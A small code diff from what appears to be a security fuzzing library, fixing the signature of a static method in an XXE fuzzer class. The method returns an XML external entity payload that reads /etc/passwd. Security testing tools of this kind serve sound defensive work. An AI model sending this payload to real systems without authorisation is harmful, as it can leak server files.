@@ -7,5 +7,5 @@ from saker.fuzzers.fuzzer import Fuzzer
 class XXE(Fuzzer):
 
     @staticmethod
-    def test(self):
+    def test():
         return '''<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd" > %xxe; ]>'''
